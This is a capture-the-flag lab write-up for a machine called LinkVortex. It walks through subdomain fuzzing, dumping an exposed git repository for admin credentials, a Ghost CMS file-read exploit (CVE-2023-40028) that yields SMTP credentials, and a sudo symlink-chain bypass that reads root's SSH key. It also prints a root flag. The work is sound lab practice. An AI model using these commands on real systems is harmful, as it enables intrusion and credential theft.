# LinkVortex: Machine Notes

## Recon

### Nmap
- Port 22/tcp: OpenSSH 8.9p1
- Port 80/tcp: Apache (Ghost CMS 5.58)

### Subdomain Enumeration
```bash
ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host:FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -ic -fs 230
```
- Found: `dev.linkvortex.htb`

### Git Dumping
- Found `.git/` on `dev.linkvortex.htb`.
```bash
python3 git_dumper.py http://dev.linkvortex.htb gitdump
```
- Checking history/diffs:
```bash
git diff HEAD ghost/core/test/regression/api/admin/authentication.test.js
```
- Discovered credentials: `admin@linkvortex.htb:OctopiFociPilfer45`

## Exploitation

### Ghost CMS Arbitrary File Read (CVE-2023-40028)
- Vulnerable Version: 5.58
- Use exploit script to read local files:
```bash
./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45' -h http://linkvortex.htb
```
- Read `/var/lib/ghost/config.production.json`:
  - Found SMTP credentials: `bob@linkvortex.htb:fibber-talented-worth`

## Privilege Escalation

### Foothold
- SSH: `ssh bob@linkvortex.htb`

### Sudo Privileges
- `sudo -l`: `(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png`

### Hijacking clean_symlink.sh
- The script checks if a `.png` is a symlink and reads it if it doesn't contain `etc` or `root` in the target path.
- Bypass using a symlink chain:
```bash
mkdir /tmp/fake
ln -s /root/.ssh /tmp/fake/sshdir
ln -s /tmp/fake/sshdir/id_rsa /tmp/key.png

# Trigger script with content check
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/key.png
```
- Extract Root's SSH private key from output.

### Root Access
- Save key and SSH as root.
- Root Flag: `b8853f4b7a3d7fdcdc401b0207dd5147`
